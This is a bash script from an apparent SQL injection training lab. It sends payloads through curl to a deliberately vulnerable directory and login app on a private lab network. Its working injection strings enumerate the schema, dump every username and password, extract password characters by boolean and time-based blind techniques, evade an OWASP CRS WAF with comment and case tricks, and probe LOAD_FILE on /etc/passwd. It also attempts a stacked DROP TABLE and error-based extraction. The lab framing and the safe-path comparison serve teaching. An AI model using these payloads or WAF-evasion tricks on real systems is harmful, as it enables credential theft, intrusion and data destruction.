#!/bin/bash
# Cardinal — ADVANCED SQL injection techniques (manual, via the proxy).
#
# Goes beyond the basic auth-bypass / simple-UNION set in manual_payloads.sh.
# Each block is a distinct *technique class*; the comment says what it does and
# what to expect against this app. Query shapes being attacked:
#
#   /search (concat):  SELECT id,name,title,department,email,phone,location
#                      FROM directory WHERE name LIKE '%<q>%' ORDER BY name LIMIT 50
#                      -> 7 columns; injection is INSIDE a LIKE '%...%' string.
#   /login  (concat):  SELECT id,username,display_name,bio,homepage FROM users
#                      WHERE username='<u>' AND password='<p>'   -> 5 columns.
#
# String constants are written as hex (0x..) so payloads need only the single
# breakout quote -- this is itself a mild WAF-evasion habit. We hit the JSON API
# (/api/directory) for extraction so the exfiltrated data is easy to read.
#
# Usage:  kathara connect attacker ; /scripts/advanced_payloads.sh
set -u
PROXY="http://172.30.0.10"
API="$PROXY/api/directory"

hr(){ echo; echo "=================================================================="; echo "$1"; echo "=================================================================="; }
# send <label> <q-payload> : GET /api/directory?impl=concat&q=<payload>, show JSON results
send(){ echo "--- $1"; echo "    q= $2";
  curl -s -G "$API" --data-urlencode "impl=concat" --data-urlencode "q=$2" \
    | python3 -c 'import sys,json;
d=json.load(sys.stdin); rows=d.get("results",[])
print("    rows:",len(rows))
for r in rows[:8]: print("      ", r.get("name"),"|",r.get("title"),"|",r.get("department"))' 2>/dev/null || echo "    (non-JSON / error response)"; }

hr "1. SCHEMA ENUMERATION via UNION + information_schema"
# The classic escalation after confirming UNION: map the database without guessing.
send "1a. server version / current user / current db" \
  "zzz' UNION SELECT 1,@@version,current_user(),database(),5,6,7-- -"
send "1b. all tables in the current database" \
  "zzz' UNION SELECT 1,table_name,table_schema,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()-- -"
send "1c. all columns of the users table (name via hex 0x7573657273)" \
  "zzz' UNION SELECT 1,column_name,data_type,4,5,6,7 FROM information_schema.columns WHERE table_name=0x7573657273-- -"
send "1d. dump every user:password in one shot (GROUP_CONCAT beats the LIMIT)" \
  "zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users-- -"

hr "2. BOOLEAN-BASED BLIND (no data echoed; infer from row presence)"
# Oracle: 'Alice%' AND <cond> -- -  => rows only come back when <cond> is TRUE.
send "2a. TRUE  condition (1=1)  -> Alice row returns" \
  "Alice%' AND 1=1-- -"
send "2b. FALSE condition (1=2)  -> no rows" \
  "Alice%' AND 1=2-- -"
send "2c. data inference: is 1st char of alice's password 'a' (0x61)? TRUE" \
  "Alice%' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=0x616c696365)=0x61-- -"
send "2d. same test for 'z' (0x7a) -> FALSE (no rows)" \
  "Alice%' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=0x616c696365)=0x7a-- -"

hr "3. TIME-BASED BLIND (infer from response delay; works with zero output)"
echo "    (each call prints curl's own total time)"
timed(){ echo "--- $1"; local t; t=$(curl -s -G "$API" --data-urlencode "impl=concat" --data-urlencode "q=$2" -o /dev/null -w '%{time_total}'); echo "    time_total: ${t}s"; }
timed "3a. condition FALSE -> fast (no sleep)" \
  "zzz' UNION SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username=0x616c696365)=0x7a,SLEEP(3),0),2,3,4,5,6,7-- -"
timed "3b. condition TRUE  -> ~3s delay (SLEEP fired)" \
  "zzz' UNION SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username=0x616c696365)=0x61,SLEEP(3),0),2,3,4,5,6,7-- -"

hr "4. WAF / SIGNATURE EVASION (same UNION, obfuscated to dodge naive filters)"
# The proxy now runs a live Coraza + OWASP CRS WAF: 172.30.0.10:80 ENFORCES
# (blocks with 403), :8080 is detection-only (logs, forwards). This script hits
# :80, so these are real evasion ATTEMPTS against CRS, not free wins -- the plain
# "UNION SELECT" in other sections may be 403'd here. The point is that a *string*
# filter for 'UNION SELECT' is defeated while the query's STRUCTURE is unchanged
# (a parser still sees a UNION). Check what CRS actually did in /shared/waf_audit.log,
# and compare against the detection port (172.30.0.10:8080) for the pre-WAF baseline.
send "4a. inline comment replaces the space between keywords: UNION/**/SELECT" \
  "zzz' UNION/**/SELECT 1,username,password,4,5,6,7 FROM users-- -"
send "4b. mixed case: uNiOn sElEcT" \
  "zzz' uNiOn sElEcT 1,username,password,4,5,6,7 FROM users-- -"
send "4c. MySQL versioned comment: /*!50000UNION*/ /*!50000SELECT*/" \
  "zzz' /*!50000UNION*/ /*!50000SELECT*/ 1,username,password,4,5,6,7 FROM users-- -"

hr "5. PRIVILEGE / FILESYSTEM PROBING (expected: BLOCKED -> shows the boundary)"
send "5a. current privileges (portal user is scoped to portal.* only)" \
  "zzz' UNION SELECT 1,grantee,privilege_type,4,5,6,7 FROM information_schema.user_privileges-- -"
send "5b. read /etc/passwd via LOAD_FILE (needs global FILE priv -> expect NULL)" \
  "zzz' UNION SELECT 1,LOAD_FILE(0x2f6574632f706173737764),3,4,5,6,7-- -"

hr "6. NEGATIVE RESULTS worth documenting (defenses that hold here)"
echo "--- 6a. STACKED query: '; DROP TABLE ... -- PyMySQL sends ONE statement -> 500, no drop"
curl -s -G "$PROXY/search" --data-urlencode "impl=concat" --data-urlencode "q=zzz'; DROP TABLE comments-- -" -o /dev/null -w "    HTTP %{http_code} (500 = rejected, table intact)\n"
echo "--- 6b. ERROR-BASED extraction (extractvalue): reaches DB but app hides errors -> 500, no leak"
curl -s -G "$PROXY/search" --data-urlencode "impl=concat" --data-urlencode "q=zzz' AND extractvalue(1,concat(0x7e,(SELECT password FROM users LIMIT 1)))-- -" -o /dev/null -w "    HTTP %{http_code} (reaches DB, but no error text returned)\n"

hr "7. SAFE-PATH CONTROL (identical payload, two paths -> opposite outcomes)"
send "7a. GROUP_CONCAT dump on the VULNERABLE concat path -> leaks every credential" \
  "zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users-- -"
echo "--- 7b. the SAME payload on the SAFE param path -> bound as a literal, 0 rows"
curl -s -G "$API" --data-urlencode "impl=param" --data-urlencode "q=zzz' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3,4,5,6,7 FROM users-- -" \
  | python3 -c 'import sys,json;print("    param path rows:",len(json.load(sys.stdin).get("results",[])))' 2>/dev/null

echo; echo "[*] done. Compare section 4 (evaded but structurally identical) against"
echo "    the monitor capture: the bytes differ, the parse tree does not."
